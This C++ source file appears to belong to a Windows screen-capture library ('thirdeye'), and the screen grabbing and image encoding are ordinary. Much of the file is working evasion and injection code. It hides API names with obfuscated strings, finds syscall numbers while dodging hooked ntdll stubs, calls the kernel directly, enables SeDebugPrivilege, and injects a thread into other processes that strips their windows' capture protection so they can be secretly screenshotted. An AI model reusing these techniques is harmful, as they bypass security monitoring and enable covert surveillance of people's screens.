#include "thirdeye_core.h"
#include "version_info.h"
#include "internal.h"
#include "lge_syscalls.h"
#include "dynresolve.h"
#include <cstdio>
#include <chrono>
#include <atomic>

#define TJE_IMPLEMENTATION
#include "tiny_jpeg.h"
extern "C" {
#define LODEPNG_NO_COMPILE_CPP
#include "lodepng.h"
}

template <typename T>
static T ResolveApi(HMODULE hMod, const char* name) {
    return (T)DynGetProcAddress(hMod, name);
}

typedef HDC(WINAPI* pGetDC)(HWND);
typedef int(WINAPI* pReleaseDC)(HWND, HDC);
typedef HWND(WINAPI* pGetDesktopWindow)(void);
typedef HDC(WINAPI* pCreateCompatibleDC)(HDC);
typedef HBITMAP(WINAPI* pCreateCompatibleBitmap)(HDC, int, int);
typedef HGDIOBJ(WINAPI* pSelectObject)(HDC, HGDIOBJ);
typedef BOOL(WINAPI* pDeleteObject)(HGDIOBJ);
typedef BOOL(WINAPI* pDeleteDC)(HDC);
typedef BOOL(WINAPI* pBitBlt)(HDC, int, int, int, int, HDC, int, int, DWORD);
typedef int(WINAPI* pGetSystemMetrics)(int);
typedef int(WINAPI* pGetDIBits)(HDC, HBITMAP, UINT, UINT, LPVOID, LPBITMAPINFO, UINT);

struct CaptureApis {
    pGetDC GetDC;
    pReleaseDC ReleaseDC;
    pGetDesktopWindow GetDesktopWindow;
    pCreateCompatibleDC CreateCompatibleDC;
    pCreateCompatibleBitmap CreateCompatibleBitmap;
    pSelectObject SelectObject;
    pDeleteObject DeleteObject;
    pDeleteDC DeleteDC;
    pBitBlt BitBlt;
    pGetSystemMetrics GetSystemMetrics;
    pGetDIBits GetDIBits;
    bool ready;
};

static const CaptureApis& GetCaptureApis() {
    static CaptureApis a = []() {
        CaptureApis r = {};
        static constexpr auto obfUser32 = MAKE_OBF("user32.dll");
        static constexpr auto obfGdi32 = MAKE_OBF("gdi32.dll");
        HMODULE hU32 = DynGetOrLoad(DECR_STR(obfUser32));
        HMODULE hG32 = DynGetOrLoad(DECR_STR(obfGdi32));
        if (!hU32 || !hG32) return r;
        static constexpr auto oGetDC = MAKE_OBF("GetDC");
        static constexpr auto oReleaseDC = MAKE_OBF("ReleaseDC");
        static constexpr auto oDesk = MAKE_OBF("GetDesktopWindow");
        static constexpr auto oGetSysMet = MAKE_OBF("GetSystemMetrics");
        static constexpr auto oCreateDC = MAKE_OBF("CreateCompatibleDC");
        static constexpr auto oCreateBmp = MAKE_OBF("CreateCompatibleBitmap");
        static constexpr auto oSelectObj = MAKE_OBF("SelectObject");
        static constexpr auto oDeleteObj = MAKE_OBF("DeleteObject");
        static constexpr auto oDeleteDC = MAKE_OBF("DeleteDC");
        static constexpr auto oBitBlt = MAKE_OBF("BitBlt");
        static constexpr auto oGetDIBits = MAKE_OBF("GetDIBits");
        r.GetDC = ResolveApi<pGetDC>(hU32, DECR_STR(oGetDC));
        r.ReleaseDC = ResolveApi<pReleaseDC>(hU32, DECR_STR(oReleaseDC));
        r.GetDesktopWindow = ResolveApi<pGetDesktopWindow>(hU32, DECR_STR(oDesk));
        r.GetSystemMetrics = ResolveApi<pGetSystemMetrics>(hU32, DECR_STR(oGetSysMet));
        r.CreateCompatibleDC = ResolveApi<pCreateCompatibleDC>(hG32, DECR_STR(oCreateDC));
        r.CreateCompatibleBitmap = ResolveApi<pCreateCompatibleBitmap>(hG32, DECR_STR(oCreateBmp));
        r.SelectObject = ResolveApi<pSelectObject>(hG32, DECR_STR(oSelectObj));
        r.DeleteObject = ResolveApi<pDeleteObject>(hG32, DECR_STR(oDeleteObj));
        r.DeleteDC = ResolveApi<pDeleteDC>(hG32, DECR_STR(oDeleteDC));
        r.BitBlt = ResolveApi<pBitBlt>(hG32, DECR_STR(oBitBlt));
        r.GetDIBits = ResolveApi<pGetDIBits>(hG32, DECR_STR(oGetDIBits));
        r.ready = r.GetDC && r.ReleaseDC && r.GetDesktopWindow && r.GetSystemMetrics &&
                  r.CreateCompatibleDC && r.CreateCompatibleBitmap && r.SelectObject &&
                  r.DeleteObject && r.DeleteDC && r.BitBlt && r.GetDIBits;
        return r;
    }();
    return a;
}

typedef BOOL(WINAPI* pEnumWindows)(WNDENUMPROC, LPARAM);
typedef BOOL(WINAPI* pIsWindowVisible)(HWND);
typedef DWORD(WINAPI* pGetWindowThreadProcessId)(HWND, LPDWORD);

struct WindowApis {
    pEnumWindows EnumWindows;
    pIsWindowVisible IsWindowVisible;
    pGetWindowThreadProcessId GetWindowThreadProcessId;
    bool ready;
};

static const WindowApis& GetWindowApis() {
    static WindowApis a = []() {
        WindowApis r = {};
        static constexpr auto obfUser32 = MAKE_OBF("user32.dll");
        HMODULE hU32 = DynGetOrLoad(DECR_STR(obfUser32));
        if (!hU32) return r;
        static constexpr auto oEnum = MAKE_OBF("EnumWindows");
        static constexpr auto oVisible = MAKE_OBF("IsWindowVisible");
        static constexpr auto oThreadPid = MAKE_OBF("GetWindowThreadProcessId");
        r.EnumWindows = ResolveApi<pEnumWindows>(hU32, DECR_STR(oEnum));
        r.IsWindowVisible = ResolveApi<pIsWindowVisible>(hU32, DECR_STR(oVisible));
        r.GetWindowThreadProcessId = ResolveApi<pGetWindowThreadProcessId>(hU32, DECR_STR(oThreadPid));
        r.ready = r.EnumWindows && r.IsWindowVisible && r.GetWindowThreadProcessId;
        return r;
    }();
    return a;
}

struct ByteSink {
    uint8_t* data;
    size_t size;
    size_t cap;
    bool overflow;

    ByteSink() : data(nullptr), size(0), cap(0), overflow(false) {}
    ~ByteSink() { free(data); }

    bool append(const void* src, size_t n) {
        if (overflow) return false;
        if (size + n > cap) {
            size_t newCap = cap ? cap * 2 : 1 << 16;
            while (newCap < size + n) newCap *= 2;
            uint8_t* nd = (uint8_t*)realloc(data, newCap);
            if (!nd) { overflow = true; return false; }
            data = nd;
            cap = newCap;
        }
        memcpy(data + size, src, n);
        size += n;
        return true;
    }
};

static uint8_t* ExtractBgra(const CaptureApis& cap, HDC memDC, HBITMAP hBitmap,
                            int w, int h) {
    size_t bytes = (size_t)w * (size_t)h * 4;
    uint8_t* buf = (uint8_t*)malloc(bytes);
    if (!buf) return nullptr;

    BITMAPINFO bmi = {};
    bmi.bmiHeader.biSize = sizeof(BITMAPINFOHEADER);
    bmi.bmiHeader.biWidth = w;
    bmi.bmiHeader.biHeight = -h; // negative -> top-down rows
    bmi.bmiHeader.biPlanes = 1;
    bmi.bmiHeader.biBitCount = 32;
    bmi.bmiHeader.biCompression = BI_RGB;

    int rows = cap.GetDIBits(memDC, hBitmap, 0, (UINT)h, buf, &bmi, DIB_RGB_COLORS);
    if (rows != h) { free(buf); return nullptr; }
    return buf;
}

static uint8_t* BgraToRgb(const uint8_t* bgra, int w, int h) {
    size_t px = (size_t)w * (size_t)h;
    uint8_t* rgb = (uint8_t*)malloc(px * 3);
    if (!rgb) return nullptr;
    const uint8_t* s = bgra;
    uint8_t* d = rgb;
    for (size_t i = 0; i < px; ++i) {
        d[0] = s[2]; // R
        d[1] = s[1]; // G
        d[2] = s[0]; // B
        s += 4;
        d += 3;
    }
    return rgb;
}

static void TjeWriteCb(void* context, void* data, int size) {
    ((ByteSink*)context)->append(data, (size_t)size);
}

static bool EncodeJpeg(const uint8_t* rgb, int w, int h, int quality, ByteSink* out) {
    if (quality < 0) quality = 0;
    if (quality > 100) quality = 100;
    return tje_encode_with_func(TjeWriteCb, out, quality, w, h, 3, rgb) == 1 &&
           !out->overflow && out->size > 0;
}

static bool EncodePng(const uint8_t* rgb, int w, int h, ByteSink* out) {
    unsigned char* png = nullptr;
    size_t pngSize = 0;
    unsigned err = lodepng_encode24(&png, &pngSize, rgb, (unsigned)w, (unsigned)h);
    if (err != 0 || !png) return false;
    bool ok = out->append(png, pngSize);
    free(png);
    return ok;
}

static bool EncodeBmp(const uint8_t* bgra, int w, int h, ByteSink* out) {
    const long pad = (long)((w * -3L) & 3);
    const uint32_t rowSize = (uint32_t)(w * 3 + pad);
    const uint32_t pixelBytes = rowSize * (uint32_t)h;
    const uint32_t fileSize = 54 + pixelBytes;

    uint8_t header[54] = {};
    header[0] = 0x42; // 'B'
    header[1] = 0x4D; // 'M'
    header[2] = (uint8_t)(fileSize >> 0);
    header[3] = (uint8_t)(fileSize >> 8);
    header[4] = (uint8_t)(fileSize >> 16);
    header[5] = (uint8_t)(fileSize >> 24);
    header[10] = 54;                      // bfOffBits
    header[14] = 40;                      // biSize
    header[18] = (uint8_t)(w >> 0);
    header[19] = (uint8_t)(w >> 8);
    header[20] = (uint8_t)(w >> 16);
    header[21] = (uint8_t)(w >> 24);
    header[22] = (uint8_t)(h >> 0);       // biHeight positive -> bottom-up
    header[23] = (uint8_t)(h >> 8);
    header[24] = (uint8_t)(h >> 16);
    header[25] = (uint8_t)(h >> 24);
    header[26] = 1;                       // biPlanes
    header[28] = 24;                      // biBitCount

    if (!out->append(header, sizeof(header))) return false;

    uint8_t* row = (uint8_t*)malloc(rowSize);
    if (!row) return false;
    for (int y = h - 1; y >= 0; --y) {
        const uint8_t* src = bgra + (size_t)y * (size_t)w * 4;
        uint8_t* d = row;
        for (int x = 0; x < w; ++x) {
            d[0] = src[0]; // B
            d[1] = src[1]; // G
            d[2] = src[2]; // R
            src += 4;
            d += 3;
        }
        for (long p = 0; p < pad; ++p) *d++ = 0;
        if (!out->append(row, rowSize)) { free(row); return false; }
    }
    free(row);
    return !out->overflow;
}

static bool CaptureToMemDc(ThirdeyeContext* ctx, const CaptureApis& c, int w, int h,
                           HDC* outScreenDC, HDC* outMemDC, HBITMAP* outBmp) {
    int x = c.GetSystemMetrics(SM_XVIRTUALSCREEN);
    int y = c.GetSystemMetrics(SM_YVIRTUALSCREEN);

    HDC hdcScreen = c.GetDC(nullptr);
    if (!hdcScreen) {
        // Fallback: some hosts (taskhostw) need an explicit desktop HWND.
        HWND desk = c.GetDesktopWindow();
        if (desk) hdcScreen = c.GetDC(desk);
    }
    if (!hdcScreen) {
        SetLastErrorMsg(ctx, REVEAL_CSTR(SHRED("Failed to get screen DC")));
        return false;
    }
    HDC hdcMemDC = c.CreateCompatibleDC(hdcScreen);
    HBITMAP hbm = c.CreateCompatibleBitmap(hdcScreen, w, h);
    if (!hdcMemDC || !hbm) {
        if (hbm) c.DeleteObject(hbm);
        if (hdcMemDC) c.DeleteDC(hdcMemDC);
        c.ReleaseDC(nullptr, hdcScreen);
        SetLastErrorMsg(ctx, REVEAL_CSTR(SHRED("Failed to create capture surface")));
        return false;
    }
    c.SelectObject(hdcMemDC, hbm);
    if (!c.BitBlt(hdcMemDC, 0, 0, w, h, hdcScreen, x, y, SRCCOPY)) {
        c.DeleteObject(hbm);
        c.DeleteDC(hdcMemDC);
        c.ReleaseDC(nullptr, hdcScreen);
        SetLastErrorMsg(ctx, REVEAL_CSTR(SHRED("BitBlt failed during screen capture")));
        return false;
    }
    *outScreenDC = hdcScreen;
    *outMemDC = hdcMemDC;
    *outBmp = hbm;
    return true;
}

static bool CaptureEncoded(ThirdeyeContext* ctx, const ThirdeyeOptions& opts, ByteSink* out) {
    const CaptureApis& c = GetCaptureApis();
    if (!c.ready) {
        SetLastErrorMsg(ctx, REVEAL_CSTR(SHRED("Capture API unavailable")));
        return false;
    }

    int w = c.GetSystemMetrics(SM_CXVIRTUALSCREEN);
    int h = c.GetSystemMetrics(SM_CYVIRTUALSCREEN);
    if (w <= 0 || h <= 0) {
        w = c.GetSystemMetrics(SM_CXSCREEN);
        h = c.GetSystemMetrics(SM_CYSCREEN);
    }
    if (w <= 0 || h <= 0) {
        SetLastErrorMsg(ctx, REVEAL_CSTR(SHRED("Invalid screen metrics")));
        return false;
    }

    HDC hdcScreen = nullptr, hdcMemDC = nullptr;
    HBITMAP hbm = nullptr;
    if (!CaptureToMemDc(ctx, c, w, h, &hdcScreen, &hdcMemDC, &hbm)) return false;

    uint8_t* bgra = ExtractBgra(c, hdcMemDC, hbm, w, h);
    c.DeleteObject(hbm);
    c.DeleteDC(hdcMemDC);
    c.ReleaseDC(nullptr, hdcScreen);

    if (!bgra) {
        SetLastErrorMsg(ctx, REVEAL_CSTR(SHRED("Failed to read bitmap pixels")));
        return false;
    }

    bool ok = false;
    if (opts.format == THIRDEYE_FORMAT_BMP) {
        ok = EncodeBmp(bgra, w, h, out);
    } else {
        uint8_t* rgb = BgraToRgb(bgra, w, h);
        if (rgb) {
            if (opts.format == THIRDEYE_FORMAT_PNG) {
                ok = EncodePng(rgb, w, h, out);
            } else { // JPEG default
                ok = EncodeJpeg(rgb, w, h, opts.quality, out);
            }
            free(rgb);
        }
    }
    free(bgra);

    if (!ok) {
        SetLastErrorMsg(ctx, REVEAL_CSTR(SHRED("Failed to encode image")));
    }
    return ok;
}

static INIT_ONCE g_SyscallInitOnce = INIT_ONCE_STATIC_INIT;
static bool g_SyscallInitResult = false;

static BOOL CALLBACK SyscallInitOnceCallback(PINIT_ONCE, PVOID, PVOID*) {
    g_SyscallInitResult = InitializeSyscalls();
    return TRUE;
}

#define MAX_PROCESSES 128
#define MAX_INJECTIONS 128

// Defined further below; used by the public capture entry points.
struct ByteSink;
static bool TryElevatedCapture(const wchar_t* outPathW, ByteSink* sink,
    ThirdeyeFormat format, int quality);
static bool IsElevatedProxyInstance();
static void SignalElevatedCaptureDone(bool ok);
static bool ResolveStagingFilePath(wchar_t* out, size_t outChars);

struct ProcessHwnds {
    DWORD pid;
    DWORD count;
    HWND hwnds[MAX_HWNDS_PER_PID];
};

struct ProcessWindowSet {
    size_t count;
    ProcessHwnds entries[MAX_PROCESSES];
};

struct InjectionList {
    size_t count;
    RemoteContext items[MAX_INJECTIONS];
};

static void CleanupInjections(RemoteContext* injections, size_t count);
struct CleanupThreadArg {
    RemoteContext* items;
    size_t count;
};
static DWORD WINAPI CleanupThreadProc(LPVOID param) {
    auto* arg = (CleanupThreadArg*)param;
    CleanupInjections(arg->items, arg->count);
    free(arg->items);
    free(arg);
    return 0;
}
static void StartCleanupThread(const RemoteContext* items, size_t count) {
    if (count == 0) return;
    auto* copy = (RemoteContext*)malloc(count * sizeof(RemoteContext));
    if (!copy) {
        CleanupInjections(const_cast<RemoteContext*>(items), count);
        return;
    }
    memcpy(copy, items, count * sizeof(RemoteContext));
    auto* arg = (CleanupThreadArg*)malloc(sizeof(CleanupThreadArg));
    if (!arg) {
        free(copy);
        CleanupInjections(const_cast<RemoteContext*>(items), count);
        return;
    }
    arg->items = copy;
    arg->count = count;
    HANDLE h = CreateThread(nullptr, 0, CleanupThreadProc, arg, 0, nullptr);
    if (h) {
        CloseHandle(h);
    } else {
        CleanupThreadProc(arg);
    }
}

void SetLastErrorMsg(ThirdeyeContext* ctx, const char* msg) {
    if (ctx) {
        strncpy(ctx->lastError, msg, sizeof(ctx->lastError) - 1);
        ctx->lastError[sizeof(ctx->lastError) - 1] = '\0';
    }
}

HMODULE GetNtdllHandle() {
    static HMODULE hNtdll = nullptr;
    if (!hNtdll) {
        static constexpr auto obfNtdll = MAKE_OBF("ntdll.dll");
        hNtdll = DynGetModuleHandle(DECR_STR(obfNtdll));
    }
    return hNtdll;
}

DWORD GetSyscallNumber(const char* funcName) {
    HMODULE hNtdll = GetNtdllHandle();
    if (!hNtdll) return 0;

    BYTE* pBase = (BYTE*)hNtdll;
    PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)pBase;
    if (pDos->e_magic != IMAGE_DOS_SIGNATURE) return 0;
    PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)(pBase + pDos->e_lfanew);
    if (pNt->Signature != IMAGE_NT_SIGNATURE) return 0;
    BYTE* pEnd = pBase + pNt->OptionalHeader.SizeOfImage;

    BYTE* pFunc = (BYTE*)DynGetProcAddress(hNtdll, funcName);
    if (!pFunc) return 0;

    auto IsCleanStub = [](const BYTE* s) {
        return s[0] == 0x4C && s[1] == 0x8B && s[2] == 0xD1 && s[3] == 0xB8 &&
               s[6] == 0x00 && s[7] == 0x00;
    };
    auto ReadSsn = [](const BYTE* s) -> WORD {
        return (WORD)((s[5] << 8) | s[4]);
    };

    if (IsCleanStub(pFunc)) {
        return ReadSsn(pFunc);
    }

    const bool hookedAt0 = (pFunc[0] == 0xE9);
    const bool hookedAt3 = (pFunc[3] == 0xE9);
    if (!hookedAt0 && !hookedAt3) {
        return 0;
    }

    constexpr int STUB_SIZE = 32;  
    constexpr int MAX_SEARCH = 500;
    for (int idx = 1; idx <= MAX_SEARCH; idx++) {

        BYTE* down = pFunc + (idx * STUB_SIZE);
        if (down + 8 <= pEnd && IsCleanStub(down)) {
            return (DWORD)(ReadSsn(down) - idx);
        }

        BYTE* up = pFunc - (idx * STUB_SIZE);
        if (up >= pBase && up + 8 <= pEnd && IsCleanStub(up)) {
            return (DWORD)(ReadSsn(up) + idx);
        }
    }

    return 0;
}

bool InitializeSyscalls() {

    return LgeInitialize();
}

// When running non-elevated against a protected window owned by an ELEVATED
// process, NtOpenProcess is denied by the integrity-level check. Granting our
// own token SeDebugPrivilege (which an admin-split token still holds, just
// disabled) lets us open processes regardless of IL. Best effort: fails
// silently when the caller isn't an admin, preserving prior behavior.
static void TryEnableDebugPrivilege() {
    typedef BOOL(WINAPI* pOpenProcessToken)(HANDLE, DWORD, PHANDLE);
    typedef BOOL(WINAPI* pLookupPrivilegeValueW)(LPCWSTR, LPCWSTR, PLUID);
    typedef BOOL(WINAPI* pAdjustTokenPrivileges)(HANDLE, BOOL, PTOKEN_PRIVILEGES, DWORD, PTOKEN_PRIVILEGES, PDWORD);

    static constexpr auto obfAdvapi = MAKE_OBF("advapi32.dll");
    static constexpr auto obfOpenTok = MAKE_OBF("OpenProcessToken");
    static constexpr auto obfLookup = MAKE_OBF("LookupPrivilegeValueW");
    static constexpr auto obfAdjust = MAKE_OBF("AdjustTokenPrivileges");
    static constexpr auto obfPriv = MAKE_OBF("SeDebugPrivilege");

    HMODULE hAdv = DynGetOrLoad(DECR_STR(obfAdvapi));
    if (!hAdv) return;

    pOpenProcessToken fnOpen = ResolveApi<pOpenProcessToken>(hAdv, DECR_STR(obfOpenTok));
    pLookupPrivilegeValueW fnLookup = ResolveApi<pLookupPrivilegeValueW>(hAdv, DECR_STR(obfLookup));
    pAdjustTokenPrivileges fnAdjust = ResolveApi<pAdjustTokenPrivileges>(hAdv, DECR_STR(obfAdjust));
    if (!fnOpen || !fnLookup || !fnAdjust) return;

    HANDLE hToken = nullptr;
    if (!fnOpen(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) return;

    wchar_t privName[32];
    TeAsciiToWide(privName, 32, DECR_STR(obfPriv));

    LUID luid;
    if (fnLookup(nullptr, privName, &luid)) {
        TOKEN_PRIVILEGES tp = {};
        tp.PrivilegeCount = 1;
        tp.Privileges[0].Luid = luid;
        tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
        fnAdjust(hToken, FALSE, &tp, 0, nullptr, nullptr);
    }
    CloseHandle(hToken);
}

HANDLE NtOpenProcessDirect(DWORD pid, ACCESS_MASK desiredAccess) {
    HANDLE hProcess = nullptr;
    OBJECT_ATTRIBUTES oa;
    CLIENT_ID cid;

    InitializeObjectAttributes(&oa, nullptr, 0, nullptr, nullptr);
    cid.UniqueProcess = (HANDLE)(ULONG_PTR)pid;
    cid.UniqueThread = nullptr;

    NTSTATUS status = SyscallNtOpenProcess(&hProcess, desiredAccess, &oa, &cid);
    return NT_SUCCESS(status) ? hProcess : nullptr;
}

PVOID NtAllocateMemoryDirect(HANDLE hProcess, SIZE_T size, ULONG protect) {
    PVOID baseAddr = nullptr;
    SIZE_T regionSize = size;

    NTSTATUS status = SyscallNtAllocateVirtualMemory(
        hProcess, &baseAddr, 0, &regionSize,
        MEM_COMMIT | MEM_RESERVE, protect
    );

    return NT_SUCCESS(status) ? baseAddr : nullptr;
}

bool NtWriteMemoryDirect(HANDLE hProcess, PVOID dest, PVOID src, SIZE_T size) {
    SIZE_T written = 0;
    NTSTATUS status = SyscallNtWriteVirtualMemory(hProcess, dest, src, size, &written);
    return NT_SUCCESS(status) && written == size;
}

void NtFreeMemoryDirect(HANDLE hProcess, PVOID addr) {
    PVOID baseAddr = addr;
    SIZE_T regionSize = 0;
    SyscallNtFreeVirtualMemory(hProcess, &baseAddr, &regionSize, MEM_RELEASE);
}

HANDLE NtCreateThreadDirect(HANDLE hProcess, PVOID startAddr, PVOID param) {
    HANDLE hThread = nullptr;

    NTSTATUS status = SyscallNtCreateThreadEx(
        &hThread,
        THREAD_ALL_ACCESS,
        nullptr,
        hProcess,
        startAddr,
        param,
        0,
        0,
        0,
        0,
        nullptr
    );

    return NT_SUCCESS(status) ? hThread : nullptr;
}

void NtCloseDirect(HANDLE handle) {
    if (handle && handle != INVALID_HANDLE_VALUE) {
        SyscallNtClose(handle);
    }
}

bool NtProtectMemoryDirect(HANDLE hProcess, PVOID addr, SIZE_T size, ULONG newProtect, PULONG oldProtect) {
    PVOID baseAddr = addr;
    SIZE_T regionSize = size;
    NTSTATUS status = SyscallNtProtectVirtualMemory(hProcess, &baseAddr, &regionSize, newProtect, oldProtect);
    return NT_SUCCESS(status);
}

DWORD NtWaitDirect(HANDLE handle, DWORD milliseconds) {
    LARGE_INTEGER timeout;
    timeout.QuadPart = -((LONGLONG)milliseconds * 10000);

    NTSTATUS status = SyscallNtWaitForSingleObject(handle, FALSE, &timeout);

    if (status == 0x00000000) return WAIT_OBJECT_0;
    if (status == 0x00000102) return WAIT_TIMEOUT;
    if (status == 0x00000080) return WAIT_ABANDONED;
    return WAIT_FAILED;
}

#ifndef __GNUC__
#pragma runtime_checks( "", off )
#pragma optimize( "", off )
#pragma check_stack( off )
#pragma code_seg(push, remote_seg, REMOTE_SECTION_NAME)
#endif

extern "C" SEC_REMOTE FUNC_ATTRS
DWORD __stdcall RemoteThreadProc(LPVOID lpParameter) {
    INJECTION_DATA* pData = (INJECTION_DATA*)lpParameter;

#if defined(_M_X64) || defined(__x86_64__)
    PPEB_FULL pPeb = (PPEB_FULL)__readgsqword(0x60);
#else
    PPEB_FULL pPeb = (PPEB_FULL)__readfsdword(0x30);
#endif
    PPEB_LDR_DATA_FULL pLdr = pPeb->Ldr;
    PRTL_CRITICAL_SECTION pLock = pPeb->FastPebLock;

    HMODULE hNtdll = nullptr;
    {
        PLIST_ENTRY pListHead = &pLdr->InLoadOrderModuleList;
        PLIST_ENTRY pListEntry = pListHead->Flink;
        int count = 0;
        while (pListEntry != pListHead && count < 3) {
            PLDR_DATA_TABLE_ENTRY_FULL pEntry = CONTAINING_RECORD(pListEntry, LDR_DATA_TABLE_ENTRY_FULL, InLoadOrderLinks);
            if (pEntry->BaseDllName.Buffer && pEntry->DllBase) {
                const WCHAR* ws = pEntry->BaseDllName.Buffer;
                const char* s = pData->ntdllName;
                bool match = true;
                while (*ws && *s) {
                    char c1 = (char)*ws, c2 = *s;
                    if (c1 >= 'A' && c1 <= 'Z') c1 += 32;
                    if (c2 >= 'A' && c2 <= 'Z') c2 += 32;
                    if (c1 != c2) { match = false; break; }
                    ws++; s++;
                }
                if (match && *ws == 0 && *s == 0) {
                    hNtdll = (HMODULE)pEntry->DllBase;
                    break;
                }
            }
            pListEntry = pListEntry->Flink;
            count++;
        }
    }
    if (!hNtdll) return 1;

    pRtlEnterCriticalSection fnEnterCS = nullptr;
    pRtlLeaveCriticalSection fnLeaveCS = nullptr;
    {
        BYTE* pBase = (BYTE*)hNtdll;
        PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)pBase;
        if (pDos->e_magic != IMAGE_DOS_SIGNATURE) return 1;
        PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)(pBase + pDos->e_lfanew);
        if (pNt->Signature != IMAGE_NT_SIGNATURE) return 1;
        DWORD exportRva = pNt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
        if (!exportRva) return 1;
        PIMAGE_EXPORT_DIRECTORY pExport = (PIMAGE_EXPORT_DIRECTORY)(pBase + exportRva);
        DWORD* pNames = (DWORD*)(pBase + pExport->AddressOfNames);
        WORD* pOrdinals = (WORD*)(pBase + pExport->AddressOfNameOrdinals);
        DWORD* pFunctions = (DWORD*)(pBase + pExport->AddressOfFunctions);

        for (DWORD i = 0; i < pExport->NumberOfNames && (!fnEnterCS || !fnLeaveCS); i++) {
            const char* name = (const char*)(pBase + pNames[i]);
            const char* targets[2] = { pData->enterCritSecName, pData->leaveCritSecName };
            FARPROC* results[2] = { (FARPROC*)&fnEnterCS, (FARPROC*)&fnLeaveCS };
            for (int t = 0; t < 2; t++) {
                if (*results[t]) continue;
                const char* s1 = name;
                const char* s2 = targets[t];
                bool match = true;
                while (*s1 && *s2) {
                    char c1 = *s1, c2 = *s2;
                    if (c1 >= 'A' && c1 <= 'Z') c1 += 32;
                    if (c2 >= 'A' && c2 <= 'Z') c2 += 32;
                    if (c1 != c2) { match = false; break; }
                    s1++; s2++;
                }
                if (match && *s1 == 0 && *s2 == 0) {
                    *results[t] = (FARPROC)(pBase + pFunctions[pOrdinals[i]]);
                }
            }
        }
    }
    if (!fnEnterCS || !fnLeaveCS) return 1;

    HMODULE hKernel32 = nullptr;
    fnEnterCS(pLock);
    {
        PLIST_ENTRY pListHead = &pLdr->InMemoryOrderModuleList;
        PLIST_ENTRY pListEntry = pListHead->Flink;
        while (pListEntry != pListHead) {
            PLDR_DATA_TABLE_ENTRY_FULL pEntry = CONTAINING_RECORD(pListEntry, LDR_DATA_TABLE_ENTRY_FULL, InMemoryOrderLinks);
            if (pEntry->BaseDllName.Buffer && pEntry->DllBase) {
                const WCHAR* ws = pEntry->BaseDllName.Buffer;
                const char* s = pData->kernel32Name;
                bool match = true;
                while (*ws && *s) {
                    char c1 = (char)*ws, c2 = *s;
                    if (c1 >= 'A' && c1 <= 'Z') c1 += 32;
                    if (c2 >= 'A' && c2 <= 'Z') c2 += 32;
                    if (c1 != c2) { match = false; break; }
                    ws++; s++;
                }
                if (match && *ws == 0 && *s == 0) {
                    hKernel32 = (HMODULE)pEntry->DllBase;
                    break;
                }
            }
            pListEntry = pListEntry->Flink;
        }
    }
    fnLeaveCS(pLock);
    if (!hKernel32) return 1;

    pGetModuleHandleA fnGetModuleHandleA = nullptr;
    pGetProcAddress fnGetProcAddress = nullptr;
    pWaitForSingleObject fnWaitForSingleObject = nullptr;
    pReleaseSemaphore fnReleaseSemaphore = nullptr;
    {
        BYTE* pBase = (BYTE*)hKernel32;
        PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)pBase;
        if (pDos->e_magic != IMAGE_DOS_SIGNATURE) return 1;

        PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)(pBase + pDos->e_lfanew);
        if (pNt->Signature != IMAGE_NT_SIGNATURE) return 1;

        DWORD exportRva = pNt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
        if (!exportRva) return 1;

        PIMAGE_EXPORT_DIRECTORY pExport = (PIMAGE_EXPORT_DIRECTORY)(pBase + exportRva);
        DWORD* pNames = (DWORD*)(pBase + pExport->AddressOfNames);
        WORD* pOrdinals = (WORD*)(pBase + pExport->AddressOfNameOrdinals);
        DWORD* pFunctions = (DWORD*)(pBase + pExport->AddressOfFunctions);

        const char* targets[4] = { pData->getModuleFuncName, pData->getProcFuncName, pData->waitFuncName, pData->releaseFuncName };
        FARPROC* results[4] = { (FARPROC*)&fnGetModuleHandleA, (FARPROC*)&fnGetProcAddress, (FARPROC*)&fnWaitForSingleObject, (FARPROC*)&fnReleaseSemaphore };

        for (DWORD i = 0; i < pExport->NumberOfNames; i++) {
            const char* name = (const char*)(pBase + pNames[i]);

            for (int t = 0; t < 4; t++) {
                if (*results[t]) continue;
                const char* s1 = name;
                const char* s2 = targets[t];
                bool match = true;
                while (*s1 && *s2) {
                    char c1 = *s1, c2 = *s2;
                    if (c1 >= 'A' && c1 <= 'Z') c1 += 32;
                    if (c2 >= 'A' && c2 <= 'Z') c2 += 32;
                    if (c1 != c2) { match = false; break; }
                    s1++; s2++;
                }
                if (match && *s1 == 0 && *s2 == 0) {
                    *results[t] = (FARPROC)(pBase + pFunctions[pOrdinals[i]]);
                }
            }
        }
    }
    if (!fnGetModuleHandleA || !fnGetProcAddress || !fnWaitForSingleObject || !fnReleaseSemaphore) return 1;

    typedef DWORD(NTAPI* pSetWDA)(HWND, DWORD);
    typedef DWORD(NTAPI* pGetWDA)(HWND, DWORD*);

    pSetWDA fnSetWDA = nullptr;
    pGetWDA fnGetWDA = nullptr;

    HMODULE hLib = fnGetModuleHandleA(pData->libName);
    if (hLib) {
        fnSetWDA = (pSetWDA)fnGetProcAddress(hLib, pData->setFuncName);
        fnGetWDA = (pGetWDA)fnGetProcAddress(hLib, pData->getFuncName);
    }

    if (!fnSetWDA || !fnGetWDA) return 1;

    for (DWORD i = 0; i < pData->count; i++) {
        pData->originalAffinities[i] = 0;

        if (!pData->hwnds[i]) continue;

        DWORD currentAffinity = 0;
        if (!fnGetWDA(pData->hwnds[i], &currentAffinity)) continue;
        if (currentAffinity == 0) continue;

        if (!fnSetWDA(pData->hwnds[i], 0)) continue;

        DWORD verifyAffinity = 0;
        if (!fnGetWDA(pData->hwnds[i], &verifyAffinity)) continue;
        if (verifyAffinity != 0) continue;

        pData->originalAffinities[i] = currentAffinity;
    }

    if (pData->hReadySemaphore) {
        fnReleaseSemaphore(pData->hReadySemaphore, 1, nullptr);
    }

    fnWaitForSingleObject(pData->hGlobalTriggerEvent, 10000);

    for (DWORD i = 0; i < pData->count; i++) {
        if (pData->originalAffinities[i] != 0) {
            fnSetWDA(pData->hwnds[i], pData->originalAffinities[i]);
        }
    }

    return 0;
}

#ifdef __GNUC__
